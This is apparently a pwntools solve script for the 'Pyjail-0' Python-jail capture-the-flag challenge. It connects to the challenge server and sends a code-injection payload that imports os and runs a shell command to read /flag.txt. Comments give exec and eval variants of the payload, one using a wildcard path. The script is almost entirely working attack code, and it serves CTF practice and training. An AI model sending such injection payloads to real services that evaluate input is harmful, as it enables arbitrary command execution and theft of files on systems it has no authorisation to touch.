# Pyjail-0 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5009
context.log_level = "debug"

io = remote(HOST, PORT)

# exec -> import os ; os.system(\"cat /flag.txt\")
# eval -> __import__('os').system('cat /????.txt')

payload = b"import os ; os.system(\"cat /flag.txt\")"

io.sendlineafter(b"yourself?", payload)

io.interactive()